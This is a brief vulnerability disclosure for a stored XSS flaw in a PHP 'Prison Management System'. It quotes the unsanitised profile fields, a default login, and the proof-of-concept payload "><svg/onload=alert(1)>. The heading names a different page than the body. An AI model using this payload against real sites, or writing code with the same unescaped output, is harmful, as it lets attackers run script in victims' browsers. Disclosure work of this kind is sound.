# Prison Management System
## XSS on `/Admin/changepassword.php`

### Vendor Homepage:

```
https://www.sourcecodester.com/sql/17287/prison-management-system.html
```

### Version:

```
V1.0
```

### Tested on:

```
PHP, Apache, MySQL
```

### Credentials:

```
http://localhost/prison/Account/login.php
password:- escobar2012
Email :- releaseme@gmail.com
```

### Affected Page:

```
/Employee/edit-profile.php
```

The parameter  `txtfullname` and `txtaddress` are being echoed directly into the HTML without proper sanitization or validation. This allows an attacker to inject arbitrary JavaScript code into the page, leading to XSS attacks.

```php
# Employee/edit-profile.php
<input type="text" size="77" name="txtaddress" value="USA" class="form-control">
<input type="text" size="77" name="txtfullname" value="hello" class="form-control" required="">
```

### Proof of Concept:

Payload:

```
"><svg/onload=alert(1)>
```


### Screenshot

![image-20240506134915672](./screenshot/image-20240506134915672.png)

![image-20240506134828534](./screenshot/image-20240506134828534.png)

![image-20240506134853589](./screenshot/image-20240506134853589.png)
